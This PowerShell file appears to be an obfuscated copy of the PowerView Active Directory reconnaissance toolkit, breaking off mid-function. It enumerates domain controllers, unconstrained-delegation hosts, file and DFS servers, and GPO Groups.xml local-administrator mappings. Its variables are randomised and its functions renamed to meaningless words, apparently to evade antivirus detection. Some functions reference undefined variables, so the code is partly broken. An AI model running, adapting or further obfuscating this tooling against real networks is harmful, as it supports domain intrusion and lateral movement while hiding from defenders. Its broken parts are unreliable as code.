filter Get-NetDomainController {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    if($LDAP -or $wjlQGPFM99) {
        lea -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -HUSHunWS99 -FFczobrr99 '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    else {
        $VxTriHrh99 = Get-NetDomain -qgkPCptv99 $qgkPCptv99 -elChyFUc99 $elChyFUc99
        if($VxTriHrh99) {
            $VxTriHrh99.DomainControllers
        }
    }
}
function lea {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $FSUaYgqW99 = '*',
        [String]
        $SPN,
        [String]
        $OrksNUQs99,
        [String]
        $qFXyTemm99,
        [String]
        $FFczobrr99,
        [Switch]
        $ovYOBMXt99,
        [Switch]
        $Ping,
        [Switch]
        $HUSHunWS99,
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [String]
        $ZonJcHWg99,
        [Switch]
        $XhDaGNUe99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    begin {
        $dbXGhoRC99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99 -elChyFUc99 $elChyFUc99
    }
    process {
        if ($dbXGhoRC99) {
            if($XhDaGNUe99) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $FFczobrr99 += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($ovYOBMXt99) {
                Write-Verbose "Searching for printers"
                $FFczobrr99 += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $FFczobrr99 += "(servicePrincipalName=$SPN)"
            }
            if($OrksNUQs99) {
                $FFczobrr99 += "(operatingsystem=$OrksNUQs99)"
            }
            if($qFXyTemm99) {
                $FFczobrr99 += "(operatingsystemservicepack=$qFXyTemm99)"
            }
            if($ZonJcHWg99) {
                $FFczobrr99 += "(serverreferencebl=$ZonJcHWg99)"
            }
            $ASssIkSD99 = "(&(sAMAccountType=805306369)(dnshostname=$FSUaYgqW99)$FFczobrr99)"
            Write-Verbose "lea filter : $ASssIkSD99"
            $dbXGhoRC99.filter = $ASssIkSD99
            if(-not $HUSHunWS99) {
                $Null = $dbXGhoRC99.PropertiesToLoad.Add('dnshostname')
            }
            try {
                ForEach($OduuMAwI99 in $dbXGhoRC99.FindAll()) {
                    if($OduuMAwI99) {
                        $Up = $True
                        if($Ping) {
                            $Up = Test-Connection -Count 1 -Quiet -FSUaYgqW99 $OduuMAwI99.properties.dnshostname
                        }
                        if($Up) {
                            if ($HUSHunWS99) {
                                $cAqMfgab99 = intemperance -MzRFScgm99 $OduuMAwI99.Properties
                                $cAqMfgab99.PSObject.TypeNames.Add('PowerView.Computer')
                                $cAqMfgab99
                            }
                            else {
                                $OduuMAwI99.properties.dnshostname
                            }
                        }
                    }
                }
                $dbXGhoRC99.dispose()
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}
function hyena {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,
        [String]
        $Name,
        [String]
        $kXzISpTL99,
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [String]
        $FFczobrr99,
        [Switch]
        $plhkugnk99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    process {
        if($SID -and (-not $qgkPCptv99)) {
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $CIMvuGyg99 = Convert-ADName -QdVkYekP99 $Name -QwuuysVC99 NT4 -bevdxAcf99 Canonical
                    if($CIMvuGyg99) {
                        $qgkPCptv99 = $CIMvuGyg99.split("/")[0]
                    }
                    else {
                        Write-Verbose "Error resolving SID '$SID'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Verbose "Error resolving SID '$SID' : $_"
                return $Null
            }
        }
        $ZTURSZrr99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
        if($ZTURSZrr99) {
            if($SID) {
                $ZTURSZrr99.filter = "(&(objectsid=$SID)$FFczobrr99)"
            }
            elseif($Name) {
                $ZTURSZrr99.filter = "(&(name=$Name)$FFczobrr99)"
            }
            elseif($kXzISpTL99) {
                $ZTURSZrr99.filter = "(&(samAccountName=$kXzISpTL99)$FFczobrr99)"
            }
            try {
                $WrHBfuOI99 = $ZTURSZrr99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    if($plhkugnk99) {
                        $_
                    }
                    else {
                        intemperance -MzRFScgm99 $_.Properties
                    }
                }
                $WrHBfuOI99.dispose()
            }
            catch {
                Write-Verbose "Error building the searcher object!"
            }
            $ZTURSZrr99.dispose()
        }
    }
}
function offertory {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $IBmaQYSw99 = '*',
        [String]
        $GUID,
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [Switch]
        $HUSHunWS99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    begin {
        $RAHOAgyv99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
    }
    process {
        if ($RAHOAgyv99) {
            if ($GUID) {
                $RAHOAgyv99.filter="(&(objectCategory=organizationalUnit)(name=$IBmaQYSw99)(gplink=*$GUID*))"
            }
            else {
                $RAHOAgyv99.filter="(&(objectCategory=organizationalUnit)(name=$IBmaQYSw99))"
            }
            try {
                $WrHBfuOI99 = $RAHOAgyv99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    if ($HUSHunWS99) {
                        $OU = intemperance -MzRFScgm99 $_.Properties
                        $OU.PSObject.TypeNames.Add('PowerView.OU')
                        $OU
                    }
                    else {
                        $_.properties.adspath
                    }
                }
                $WrHBfuOI99.dispose()
                $RAHOAgyv99.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function climates {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ZonJcHWg99 = "*",
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [String]
        $GUID,
        [Switch]
        $HUSHunWS99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    begin {
        $FMncoUsb99 = Get-DomainSearcher -CDwHFsqK99 $CDwHFsqK99 -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -cYIswHDZ99 "CN=Sites,CN=Configuration" -XHaombgH99 $XHaombgH99
    }
    process {
        if($FMncoUsb99) {
            if ($GUID) {
                $FMncoUsb99.filter="(&(objectCategory=site)(name=$ZonJcHWg99)(gplink=*$GUID*))"
            }
            else {
                $FMncoUsb99.filter="(&(objectCategory=site)(name=$ZonJcHWg99))"
            }
            try {
                $WrHBfuOI99 = $FMncoUsb99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    if ($HUSHunWS99) {
                        $Site = intemperance -MzRFScgm99 $_.Properties
                        $Site.PSObject.TypeNames.Add('PowerView.Site')
                        $Site
                    }
                    else {
                        $_.properties.name
                    }
                }
                $WrHBfuOI99.dispose()
                $FMncoUsb99.dispose()
            }
            catch {
                Write-Verbose $_
            }
        }
    }
}
function cloudless {
    param(
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99
    )
    $WlGHjFTW99 = Get-DomainSearcher -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99
    $WlGHjFTW99.Filter = '(sAMAccountType=805306369)'
    $Null = $WlGHjFTW99.PropertiesToLoad.Add('objectsid')
    $KxpZQgcr99 = $WlGHjFTW99.FindOne()
    if(-not $KxpZQgcr99) {
        Write-Verbose "cloudless: no results retrieved"
    }
    else {
        $XiqHbXpm99 = intemperance -MzRFScgm99 $KxpZQgcr99.Properties
        $DCSID = $XiqHbXpm99.objectsid
        $DCSID.Substring(0, $DCSID.LastIndexOf('-'))
    }
}
function subjugated {
    [CmdletBinding()]
    param(
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    function initialized {
        param([String]$Path)
        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }
    $tyHEpTsI99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -XHaombgH99 $XHaombgH99
    $tyHEpTsI99.filter = "(&(samAccountType=805306368)(|(homedirectory=*)(scriptpath=*)(profilepath=*)))"
    $tyHEpTsI99.PropertiesToLoad.AddRange(('homedirectory', 'scriptpath', 'profilepath'))
    Sort-Object -Unique -InputObject $(ForEach($zxwKRJpn99 in $tyHEpTsI99.FindAll()) {if($zxwKRJpn99.Properties['homedirectory']) {initialized($zxwKRJpn99.Properties['homedirectory'])}if($zxwKRJpn99.Properties['scriptpath']) {initialized($zxwKRJpn99.Properties['scriptpath'])}if($zxwKRJpn99.Properties['profilepath']) {initialized($zxwKRJpn99.Properties['profilepath'])}})
}
function blogs {
    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $EfjBJxIe99 = "All",
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    function conditioned {
        [CmdletBinding()]
        param(
            [byte[]]
            $Pkt
        )
        $bin = $Pkt
        $JNyBbzHy99 = [bitconverter]::ToUInt32($bin[0..3],0)
        $WFuUlhKC99 = [bitconverter]::ToUInt32($bin[4..7],0)
        $vBrKvGZT99 = 8
        $GgwPbvYX99 = @()
        for($i=1; $i -le $WFuUlhKC99; $i++){
               $NBLyRETc99 = $vBrKvGZT99
               $IXybfgLm99 = $vBrKvGZT99 + 1
               $ItFvDexW99 = [bitconverter]::ToUInt16($bin[$NBLyRETc99..$IXybfgLm99],0)
               $wJKMLqIB99 = $IXybfgLm99 + 1
               $EXINybUi99 = $wJKMLqIB99 + $ItFvDexW99 - 1
               $ursKXntD99 = [System.Text.Encoding]::Unicode.GetString($bin[$wJKMLqIB99..$EXINybUi99])
               $JzjYsYZD99 = $EXINybUi99 + 1
               $dVdwikzD99 = $JzjYsYZD99 + 3
               $lxdcQYnc99 = [bitconverter]::ToUInt32($bin[$JzjYsYZD99..$dVdwikzD99],0)
               $vQHVupCS99 = $dVdwikzD99 + 1
               $ktjmgbLA99 = $vQHVupCS99 + $lxdcQYnc99 - 1
               $DGXGlfge99 = $bin[$vQHVupCS99..$ktjmgbLA99]
               switch -wildcard ($ursKXntD99) {
                "\siteroot" {  }
                "\domainroot*" {
                    $zUAYjZqJ99 = 0
                    $typHwjkf99 = 15
                    $VfzylGbP99 = [byte[]]$DGXGlfge99[$zUAYjZqJ99..$typHwjkf99]
                    $guid = New-Object Guid(,$VfzylGbP99) # should match $iXTvXwhB99
                    $gXpApQlf99 = $typHwjkf99 + 1
                    $oZcKDxKK99 = $gXpApQlf99 + 1
                    $dSLdETZk99 = [bitconverter]::ToUInt16($DGXGlfge99[$gXpApQlf99..$oZcKDxKK99],0)
                    $rhuJrPPx99 = $oZcKDxKK99 + 1
                    $dJkKPevA99 = $rhuJrPPx99 + $dSLdETZk99 - 1
                    $ewTDKcMN99 = [System.Text.Encoding]::Unicode.GetString($DGXGlfge99[$rhuJrPPx99..$dJkKPevA99])
                    $DEXlORtc99 = $dJkKPevA99 + 1
                    $VGTlvibQ99 = $DEXlORtc99 + 1
                    $jdVJUEyb99 = [bitconverter]::ToUInt16($DGXGlfge99[$DEXlORtc99..$VGTlvibQ99],0)
                    $afzbmoOJ99 = $VGTlvibQ99 + 1
                    $uHGIbiyb99 = $afzbmoOJ99 + $jdVJUEyb99 - 1
                    $wkntaVRm99 = [System.Text.Encoding]::Unicode.GetString($DGXGlfge99[$afzbmoOJ99..$uHGIbiyb99])
                    $PWGxHnFm99 = $uHGIbiyb99 + 1
                    $HBmvDEgg99 = $PWGxHnFm99 + 3
                    $type = [bitconverter]::ToUInt32($DGXGlfge99[$PWGxHnFm99..$HBmvDEgg99],0)
                    $ohXBnItm99 = $HBmvDEgg99 + 1
                    $rdebzhpA99 = $ohXBnItm99 + 3
                    $state = [bitconverter]::ToUInt32($DGXGlfge99[$ohXBnItm99..$rdebzhpA99],0)
                    $lpOemFlk99 = $rdebzhpA99 + 1
                    $lUOcOHsm99 = $lpOemFlk99 + 1
                    $acDzAbwC99 = [bitconverter]::ToUInt16($DGXGlfge99[$lpOemFlk99..$lUOcOHsm99],0)
                    $eMhjLlZJ99 = $lUOcOHsm99 + 1
                    $uLXCUTQM99 = $eMhjLlZJ99 + $acDzAbwC99 - 1
                    if ($acDzAbwC99 -gt 0)  {
                        $RSaLzRSY99 = [System.Text.Encoding]::Unicode.GetString($DGXGlfge99[$eMhjLlZJ99..$uLXCUTQM99])
                    }
                    $YRBhKLTp99 = $uLXCUTQM99 + 1
                    $RqbmFgAC99 = $YRBhKLTp99 + 7
                    $TkopFvft99 = $DGXGlfge99[$YRBhKLTp99..$RqbmFgAC99] #dword lowDateTime #dword highdatetime
                    $VqkMZgvr99 = $RqbmFgAC99 + 1
                    $CqrbSCwe99 = $VqkMZgvr99 + 7
                    $SoTNgHXB99 = $DGXGlfge99[$VqkMZgvr99..$CqrbSCwe99]
                    $dOjEWAOF99 = $CqrbSCwe99 + 1
                    $XapDfJBA99 = $dOjEWAOF99 + 7
                    $YQtQmJXL99 = $DGXGlfge99[$dOjEWAOF99..$XapDfJBA99]
                    $zLfbrztc99 = $XapDfJBA99  + 1
                    $FbOwqQCg99 = $zLfbrztc99 + 3
                    $EfjBJxIe99 = [bitconverter]::ToUInt32($DGXGlfge99[$zLfbrztc99..$FbOwqQCg99],0)
                    $qDlISlgA99 = $FbOwqQCg99 + 1
                    $VhScNczd99 = $qDlISlgA99 + 3
                    $bJxkDKkJ99 = [bitconverter]::ToUInt32($DGXGlfge99[$qDlISlgA99..$VhScNczd99],0)
                    $jKzVBUML99 = $VhScNczd99 + 1
                    $VxPdJVTJ99 = $jKzVBUML99 + $bJxkDKkJ99 - 1
                    $PgHzTmYR99 = $DGXGlfge99[$jKzVBUML99..$VxPdJVTJ99]
                    $UmrZvDeu99 = $VxPdJVTJ99 + 1
                    $lUCpNGDT99 = $UmrZvDeu99 + 3
                    $mEoXDzWf99 = [bitconverter]::ToUInt32($DGXGlfge99[$UmrZvDeu99..$lUCpNGDT99],0)
                    $ZPEcSeje99 = $lUCpNGDT99 + 1
                    $oQppiKQj99 = $ZPEcSeje99 + $mEoXDzWf99 - 1
                    $RgUMCTTb99 = $DGXGlfge99[$ZPEcSeje99..$oQppiKQj99]
                    $UaCFOCQx99 = $oQppiKQj99 + 1
                    $sHuMLErt99 = $UaCFOCQx99 + 3
                    $yMVHfuUm99 = [bitconverter]::ToUInt32($DGXGlfge99[$UaCFOCQx99..$sHuMLErt99],0)
                    $wWWjhSYq99 = 0
                    $MwYdXkBR99 = $wWWjhSYq99 + 3
                    $MYJyzloN99 = [bitconverter]::ToUInt32($PgHzTmYR99[$wWWjhSYq99..$MwYdXkBR99],0)
                    $bSQDdNFm99 = $MwYdXkBR99 + 1
                    for($j=1; $j -le $MYJyzloN99; $j++){
                        $dyAsSoPi99 = $bSQDdNFm99
                        $eBLzuGMy99 = $dyAsSoPi99 + 3
                        $DgFfgVcC99 = [bitconverter]::ToUInt32($PgHzTmYR99[$dyAsSoPi99..$eBLzuGMy99],0)
                        $cXWrcmah99 = $eBLzuGMy99 + 1
                        $jbkclMQJ99 = $cXWrcmah99 + 7
                        $iPejOAuc99 = $PgHzTmYR99[$cXWrcmah99..$jbkclMQJ99]
                        $cDlQinrQ99 = $jbkclMQJ99 + 1
                        $FFuJFVGl99 = $cDlQinrQ99 + 3
                        $OtlLGXFH99 = [bitconverter]::ToUInt32($PgHzTmYR99[$cDlQinrQ99..$FFuJFVGl99],0)
                        $YFFkhDlC99 = $FFuJFVGl99 + 1
                        $rhDdFOkW99 = $YFFkhDlC99 + 3
                        $HWneaYmz99 = [bitconverter]::ToUInt32($PgHzTmYR99[$YFFkhDlC99..$rhDdFOkW99],0)
                        $JvzQjfyy99 = $rhDdFOkW99 + 1
                        $iRSNmyBj99 = $JvzQjfyy99 + 1
                        $jExWwpzT99 = [bitconverter]::ToUInt16($PgHzTmYR99[$JvzQjfyy99..$iRSNmyBj99],0)
                        $tzvALHDp99 = $iRSNmyBj99 + 1
                        $ShkwLWMa99 = $tzvALHDp99 + $jExWwpzT99 - 1
                        $ukjwBAjv99 = [System.Text.Encoding]::Unicode.GetString($PgHzTmYR99[$tzvALHDp99..$ShkwLWMa99])
                        $tpJEwptv99 = $ShkwLWMa99 + 1
                        $feyiuVNC99 = $tpJEwptv99 + 1
                        $dAdshcNj99 = [bitconverter]::ToUInt16($PgHzTmYR99[$tpJEwptv99..$feyiuVNC99],0)
                        $cLmviLAv99 = $feyiuVNC99 + 1
                        $NblzjWAK99 = $cLmviLAv99 + $dAdshcNj99 - 1
                        $bDmsKPNV99 = [System.Text.Encoding]::Unicode.GetString($PgHzTmYR99[$cLmviLAv99..$NblzjWAK99])
                        $RimUOuBR99 += "\\$ukjwBAjv99\$bDmsKPNV99"
                        $bSQDdNFm99 = $NblzjWAK99 + 1
                    }
                }
            }
            $vBrKvGZT99 = $ktjmgbLA99 + 1
            $UzgAjdRr99 = @{
                'Name' = $ursKXntD99
                'Prefix' = $ewTDKcMN99
                'TargetList' = $RimUOuBR99
            }
            $GgwPbvYX99 += New-Object -TypeName PSObject -Property $UzgAjdRr99
            $ewTDKcMN99 = $null
            $ursKXntD99 = $null
            $RimUOuBR99 = $null
        }
        $fOLGAsJa99 = @()
        $GgwPbvYX99 | ForEach-Object {
            if ($_.TargetList) {
                $_.TargetList | ForEach-Object {
                    $fOLGAsJa99 += $_.split("\")[2]
                }
            }
        }
        $fOLGAsJa99
    }
    function unreachable {
        [CmdletBinding()]
        param(
            [String]
            $qgkPCptv99,
            [String]
            $wjlQGPFM99,
            [String]
            $CDwHFsqK99,
            [ValidateRange(1,10000)]
            [Int]
            $XHaombgH99 = 200,
            [Management.Automation.PSCredential]
            $elChyFUc99
        )
        $TdJlnOcG99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
        if($TdJlnOcG99) {
            $ycCalfSG99 = @()
            $TdJlnOcG99.filter = "(&(objectClass=fTDfs))"
            try {
                $WrHBfuOI99 = $TdJlnOcG99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    $MzRFScgm99 = $_.Properties
                    $coNzbJbD99 = $MzRFScgm99.remoteservername
                    $Pkt = $MzRFScgm99.pkt
                    $ycCalfSG99 += $coNzbJbD99 | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$MzRFScgm99.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose "Error in parsing DFS share : $_"
                        }
                    }
                }
                $WrHBfuOI99.dispose()
                $TdJlnOcG99.dispose()
                if($pkt -and $pkt[0]) {
                    conditioned $pkt[0] | ForEach-Object {
                        if ($_ -ne "null") {
                            New-Object -TypeName PSObject -Property @{'Name'=$MzRFScgm99.name[0];'RemoteServerName'=$_}
                        }
                    }
                }
            }
            catch {
                Write-Warning "unreachable error : $_"
            }
            $ycCalfSG99 | Sort-Object -Property "RemoteServerName"
        }
    }
    function Ashcroft {
        [CmdletBinding()]
        param(
            [String]
            $qgkPCptv99,
            [String]
            $wjlQGPFM99,
            [String]
            $CDwHFsqK99,
            [ValidateRange(1,10000)]
            [Int]
            $XHaombgH99 = 200,
            [Management.Automation.PSCredential]
            $elChyFUc99
        )
        $TdJlnOcG99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
        if($TdJlnOcG99) {
            $ycCalfSG99 = @()
            $TdJlnOcG99.filter = "(&(objectClass=msDFS-Linkv2))"
            $TdJlnOcG99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
            try {
                $WrHBfuOI99 = $TdJlnOcG99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    $MzRFScgm99 = $_.Properties
                    $RimUOuBR99 = $MzRFScgm99.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($RimUOuBR99[2..($RimUOuBR99.Length-1)])
                    $ycCalfSG99 += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $sHGaIYCm99 = $_.InnerText
                            if ( $sHGaIYCm99.Contains('\') ) {
                                $YvTbjIeP99 = $sHGaIYCm99.split("\")[3]
                                $xrSAYQde99 = $MzRFScgm99.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="$YvTbjIeP99$xrSAYQde99";'RemoteServerName'=$sHGaIYCm99.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Verbose "Error in parsing target : $_"
                        }
                    }
                }
                $WrHBfuOI99.dispose()
                $TdJlnOcG99.dispose()
            }
            catch {
                Write-Warning "Ashcroft error : $_"
            }
            $ycCalfSG99 | Sort-Object -Unique -Property "RemoteServerName"
        }
    }
    $ycCalfSG99 = @()
    if ( ($EfjBJxIe99 -eq "all") -or ($EfjBJxIe99.endsWith("1")) ) {
        $ycCalfSG99 += unreachable -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
    }
    if ( ($EfjBJxIe99 -eq "all") -or ($EfjBJxIe99.endsWith("2")) ) {
        $ycCalfSG99 += Ashcroft -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
    }
    $ycCalfSG99 | Sort-Object -Property ("RemoteServerName","Name") -Unique
}
function pang {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $QgQqAEiD99,
        [Switch]
        $vTZrtbFr99
    )
    begin {
        if($vTZrtbFr99) {
            $Parts = $QgQqAEiD99.split('\')
            $nGeNlXWX99 = $Parts[0..($Parts.length-2)] -join '\'
            $yNLFxplW99 = $Parts[-1]
            $gkWADPFI99 = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose "Mounting path $QgQqAEiD99 using a temp PSDrive at $gkWADPFI99"
            try {
                $Null = New-PSDrive -Name $gkWADPFI99 -PSProvider FileSystem -Root $nGeNlXWX99  -ErrorAction Stop
            }
            catch {
                Write-Verbose "Error mounting path $QgQqAEiD99 : $_"
                return $Null
            }
            $zbwSDrXw99 = $gkWADPFI99 + ":\" + $yNLFxplW99
        }
        else {
            $zbwSDrXw99 = $QgQqAEiD99
        }
    }
    process {
        try {
            Write-Verbose "Attempting to parse GptTmpl: $zbwSDrXw99"
            $zbwSDrXw99 | Get-IniContent -ErrorAction SilentlyContinue
        }
        catch {
        }
    }
    end {
        if($vTZrtbFr99 -and $gkWADPFI99) {
            Write-Verbose "Removing temp PSDrive $gkWADPFI99"
            Get-PSDrive -Name $gkWADPFI99 -ErrorAction SilentlyContinue | Remove-PSDrive -Force
        }
    }
}
function Myers {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $QQEhjIIf99,
        [Switch]
        $vTZrtbFr99
    )
    begin {
        if($vTZrtbFr99) {
            $Parts = $QQEhjIIf99.split('\')
            $nGeNlXWX99 = $Parts[0..($Parts.length-2)] -join '\'
            $yNLFxplW99 = $Parts[-1]
            $gkWADPFI99 = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose "Mounting path $QQEhjIIf99 using a temp PSDrive at $gkWADPFI99"
            try {
                $Null = New-PSDrive -Name $gkWADPFI99 -PSProvider FileSystem -Root $nGeNlXWX99  -ErrorAction Stop
            }
            catch {
                Write-Verbose "Error mounting path $QQEhjIIf99 : $_"
                return $Null
            }
            $xEwTuRGH99 = $gkWADPFI99 + ":\" + $yNLFxplW99
        }
        else {
            $xEwTuRGH99 = $QQEhjIIf99
        }
    }
    process {
        try {
            Write-Verbose "Attempting to parse Groups.xml: $xEwTuRGH99"
            [XML]$hizpDiTL99 = Get-Content $xEwTuRGH99 -ErrorAction Stop
            $hizpDiTL99 | Select-Xml "//Groups" | Select-Object -ExpandProperty node | ForEach-Object {
                $xJcFzwjB99 = $_.Group.Properties.groupName
                $CPutuZOY99 = $_.Group.Properties.GroupSid
                if(-not $jEcIpuFm99) {
                    if($xJcFzwjB99 -match 'Administrators') {
                        $CPutuZOY99 = 'S-1-5-32-544'
                    }
                    elseif($xJcFzwjB99 -match 'Remote Desktop') {
                        $CPutuZOY99 = 'S-1-5-32-555'
                    }
                    elseif($xJcFzwjB99 -match 'Guests') {
                        $CPutuZOY99 = 'S-1-5-32-546'
                    }
                    else {
                        $CPutuZOY99 = Convert-NameToSid -QdVkYekP99 $xJcFzwjB99 | Select-Object -ExpandProperty SID
                    }
                }
                $noyaIGxx99 = $_.Group.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($noyaIGxx99) {
                    if($_.Group.filters) {
                        $EcDVMnLK99 = $_.Group.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $EcDVMnLK99 = $Null
                    }
                    if($noyaIGxx99 -isnot [System.Array]) { $noyaIGxx99 = @($noyaIGxx99) }
                    $mODZaCns99 = New-Object PSObject
                    $mODZaCns99 | Add-Member Noteproperty 'GPOPath' $xEwTuRGH99
                    $mODZaCns99 | Add-Member Noteproperty 'Filters' $EcDVMnLK99
                    $mODZaCns99 | Add-Member Noteproperty 'GroupName' $xJcFzwjB99
                    $mODZaCns99 | Add-Member Noteproperty 'GroupSID' $CPutuZOY99
                    $mODZaCns99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $mODZaCns99 | Add-Member Noteproperty 'GroupMembers' $noyaIGxx99
                    $mODZaCns99
                }
            }
        }
        catch {
        }
    }
    end {
        if($vTZrtbFr99 -and $gkWADPFI99) {
            Write-Verbose "Removing temp PSDrive $gkWADPFI99"
            Get-PSDrive -Name $gkWADPFI99 -ErrorAction SilentlyContinue | Remove-PSDrive -Force
        }
    }
}
function precursors {
    [CmdletBinding()]
    Param (
        [String]
        $tassEbfi99 = '*',
        [String]
        $TLAfcRTj99,
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [Switch]
        $qtLxhOJJ99,
        [Switch]
        $vTZrtbFr99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200
    )
    $bIkdXHCT99 = [System.StringSplitOptions]::RemoveEmptyEntries
    $SoEeqHIk99 = Get-DomainSearcher -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $CDwHFsqK99 -XHaombgH99 $XHaombgH99
    $SoEeqHIk99.filter="(&(objectCategory=groupPolicyContainer)(name=*)(gpcfilesyspath=*))"
    $SoEeqHIk99.PropertiesToLoad.AddRange(('displayname', 'name', 'gpcfilesyspath'))
    ForEach($nkFJdDWU99 in $SoEeqHIk99.FindAll()) {
        $vMRQTzlJ99 = $nkFJdDWU99.Properties['displayname']
        $tassEbfi99 = $nkFJdDWU99.Properties['name']
        $iZBfjNKO99 = $nkFJdDWU99.Properties['gpcfilesyspath']
        Write-Verbose "precursors: enumerating $iZBfjNKO99"
        $uTSPHzqh99 =  @{
            'GptTmplPath' = "$iZBfjNKO99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            'UsePSDrive' = $vTZrtbFr99
